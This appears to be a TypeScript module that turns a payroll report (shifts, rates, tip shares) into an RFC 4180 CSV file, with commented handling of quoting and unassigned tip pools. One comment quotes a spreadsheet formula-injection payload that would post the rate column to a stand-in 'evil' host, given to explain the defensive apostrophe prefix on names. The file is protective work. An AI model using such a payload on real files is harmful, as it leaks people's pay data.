// The payroll table as a file the employer hands to a bookkeeper: a flat ledger, one line
// per person per day, which is exactly what the header promises.
//
// Deliberately not a transcript of the screen. The day and range totals stay on screen and
// are left out of the file: a summary line repeats the member lines beneath it, so the
// SUM() a bookkeeper actually runs over the total column would count the same money three
// times, and no column here could be filtered to exclude them. The only line that is not a
// member is a tip pool nobody could be paid — see unassignedTip.
//
// Every figure is the server's, only formatted; the range sum in report.ts stays this
// view's only arithmetic. Pure and DOM-free: the download is the route's business, this
// is the string.

import {clockTime, dollars, minutesToHM} from './format';
import {buildRows, type Report} from './report';
import type {DayKey} from './week';

const HEADER = 'date,employee,clock_in,clock_out,hours,rate,base_pay,tip_share,total';

// RFC 4180 §2.6–2.7: a field is quoted only when it holds a comma, a quote, CR or LF, and a
// quote inside a quoted field is written twice. Employee names and emails are user-supplied,
// so this is what stands between a name holding a comma and every later column shifting.
function field(value: string): string {
  return /[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

/**
 * Excel and Sheets evaluate a cell opening with `=`, `+`, `-` or `@` — skipping a leading
 * tab or CR before they decide — so a display name is a formula waiting to run in a file
 * that carries hourly rates: `=IMPORTXML("https://evil/"&F2,"//a")` as a name posts the
 * rate column to whoever set it. A leading apostrophe is the spreadsheets' own "this is
 * text" marker and is not displayed.
 *
 * Only this column takes it: every other field is machine-generated, and prefixing a date
 * or an amount would corrupt it for a parser reading the column as a number. Residual: a
 * name legitimately beginning with `-` or `+` arrives carrying a leading apostrophe.
 */
function employeeName(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

/** Blank, never "0.00": an unknown amount and a zero one are different facts to a payroll. */
function money(amountCents: number | null): string {
  return amountCents === null ? '' : dollars(amountCents);
}

/**
 * A day whose tip pool reached nobody. The backend splits a pool by minutes and the split
 * is binary (backend/internal/tip/split.go): either largest-remainder distributes it to the
 * cent, or the day's total minutes are zero and every share is zero. So the pool and the
 * shares agree on every day the split ran, and where they disagree the unshared amount is
 * the whole pool — printed as it arrived, with no subtraction done here.
 *
 * It is not only the day nobody clocked in. The report rounds each shift to the nearest
 * minute, so a day of sub-30-second entries has member rows, zero minutes and a pool that
 * paid none of them. Without this line that money would be missing from a file that claims
 * to hold the day's tips, and SUM(tip_share) would fall short of what the employer typed.
 *
 * Hours, rate and base pay are blank because no shift and no person stand behind the line,
 * and the total is zero because nobody was paid it — so SUM(total) stays real payroll, and
 * a cross-foot that no longer balances is the point: money went in and did not come out.
 */
function unassignedTip(date: DayKey, poolCents: number): string {
  return [date, 'Unassigned tip', '', '', '', '', '', dollars(poolCents), dollars(0)].join(',');
}

export function reportToCsv(report: Report, tz: string, from: DayKey, to: DayKey): string {
  const lines = [HEADER];
  let date: DayKey = '';

  for (const row of buildRows(report, tz, from, to)) {
    // A day header carries no person, so it is not a line here — but it precedes the members
    // it covers, so its date is the date of every member line until the next header. (Every
    // day row carries a tip pool; the null check is for the type, which is flat across kinds.)
    if (row.kind === 'day' && row.tip) {
      date = row.tip.day;
      if (row.tip.cents !== row.tipShareCents) lines.push(unassignedTip(date, row.tip.cents));
      continue;
    }
    if (row.kind !== 'member') continue;

    const cells = [
      date,
      employeeName(row.label),
      // Two shifts in one day are one row on screen and one line here: each column lists its
      // own end of every shift, in worked order. Only closed shifts are bucketed, so a
      // clock-out is always there to name.
      row.shifts.map((e) => clockTime(e.clock_in_at, tz) ?? '').join(', '),
      row.shifts
        .map((e) => (e.clock_out_at ? (clockTime(e.clock_out_at, tz) ?? '') : ''))
        .join(', '),
      // h:mm, exactly as the Hours column reads. Decimal hours would be the client dividing
      // minutes it was given.
      minutesToHM(row.minutes),
      money(row.rateCents),
      money(row.basePayCents),
      money(row.tipShareCents),
      money(row.totalCents),
    ];

    lines.push(cells.map(field).join(','));
  }

  // CRLF per RFC 4180 §2.1, and no trailing one: a final empty line reads as an empty record
  // to strict parsers. An empty range leaves the header alone, which opens as a table with
  // no rows rather than as a file that failed to generate.
  return lines.join('\r\n');
}
